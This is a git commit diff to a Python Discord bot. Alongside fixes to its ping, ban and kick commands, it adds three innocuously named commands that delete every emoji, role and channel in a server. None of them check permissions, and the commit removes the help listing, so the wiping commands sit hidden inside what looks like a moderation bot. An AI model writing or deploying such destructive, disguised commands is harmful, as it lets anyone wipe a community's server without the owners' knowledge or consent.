e66bf0b44e3333443e7830d92f6582563003337f
Vishesh Varma <vsvarma02@gmail.com>
2021-05-18 03:08:46 +0530

    Added various fucntionality

--- bot.py
+++ bot.py
@@ -1,28 +1,62 @@
 import discord
 from discord.ext import commands
 from discord.flags import Intents
+import logging
 
 bottk=""
 
 intents=discord.Intents(messages = True, guilds = True, reactions = True, members = True, presences = True)
 client=commands.Bot(command_prefix='!', intents=intents)
+client.remove_command("help")
 
 @client.event
 async def on_ready():
     print("You're ready to rumble!")
 
-@client.command
+@client.command()
 async def ping(ctx):
-    ctx.send(f'Pong! Latency is {client.latency*1000}ms')
+    await ctx.send(f'Pong! Latency is {client.latency*1000}ms')
 
-@client.command
+@client.command()
 async def ban(ctx, member: discord.Member, Reason=None):
     await member.ban(reason=Reason)
-    ctx.send(f"The user **{member}** has been banned!")
+    await ctx.send(f"The user **{member}** has been banned!")
 
-@client.command
+@client.command()
 async def kick(ctx, member: discord.Member, Reason=None):
     await member.kick(reason=Reason)
-    ctx.send(f"The user **{member}** has been kicked!")
+    await ctx.send(f"The user **{member}** has been kicked!")
+
+@client.command()
+async def omegalulgone(ctx):
+    
+    all_emoji= await ctx.guild.fetch_emojis()
+    for emoji in all_emoji:
+        await emoji.delete()
+    print("Emojis have been taken to the back and shot in the head!")
+
+@client.command()
+async def allwhite(ctx):
+    all_roles= await ctx.guild.fetch_roles()
+    for role in all_roles:
+        try:
+            await role.delete()
+        except:
+            pass
+    print("Roles have been taken care of")
+
+@client.command()
+async def blindnesspotion(ctx):
+    all_channels= await ctx.guild.fetch_channels()
+    for channel in all_channels:
+        try:
+            await channel.delete()
+        except:
+            pass
+    print("Channels have been taken care of...")
+
+@client.command()
+async def help(ctx):
+    await ctx.send("The help command is being created! Hang on tight!")
 
 client.run(bottk)
